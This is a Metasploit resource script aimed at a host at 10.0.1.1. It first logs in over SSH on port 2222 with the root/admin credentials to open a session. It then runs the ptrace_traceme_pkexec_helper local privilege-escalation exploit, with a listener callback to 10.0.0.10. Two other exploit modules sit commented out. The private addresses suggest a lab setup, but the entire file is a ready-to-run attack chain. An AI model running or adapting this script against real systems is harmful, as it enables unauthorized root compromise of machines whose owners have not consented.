# First login and create a session with victim
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.1.1
set RPORT 2222
#set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
set USERNAME root
set PASSWORD admin
set VERBOSE true
set gatherproof false
save
run
back

#use linux/http/alienvault_exec
#set RHOSTS 10.0.1.1
#set RPORT 2222
#set USERNAME root
#set PASSWORD admin
#set LHOST 10.0.0.10
#set SSL false 

#use exploit/linux/http/ubiquiti_airos_file_upload
#set RHOSTS 10.0.1.1
#set RPORT 2222
#set USERNAME root
#set PASSWORD admin
#set SSL false 

# Send exploit
use exploit/linux/local/ptrace_traceme_pkexec_helper
set SESSION -1
set RHOSTS 10.0.1.1
set RPORT 2222
set USERNAME root
set PASSWORD admin
set LHOST 10.0.0.10
set SSL false 
set VERBOSE true
set AutoCheck false

run
